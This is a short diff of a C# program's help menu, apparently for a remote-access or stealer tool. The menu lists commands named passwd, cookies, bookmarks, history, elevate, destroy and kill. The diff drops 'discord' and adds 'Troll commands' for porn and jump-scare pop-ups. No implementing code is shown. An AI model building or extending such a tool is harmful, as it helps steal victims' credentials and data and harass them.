@@ -85,13 +85,16 @@ class Program
                         "  passwd",
                         "  bookmarks",
                         "  cookies",
-                        "  discord",
                         "  history",
                         "  elevate",
                         "  destroy",
                         "  pid",
                         "  bin",
                         "  kill",
+                        "",
+                        "Troll commands: ",
+                        "   Porn",
+                        "   jumpScare",
                     }));
                     break;
 
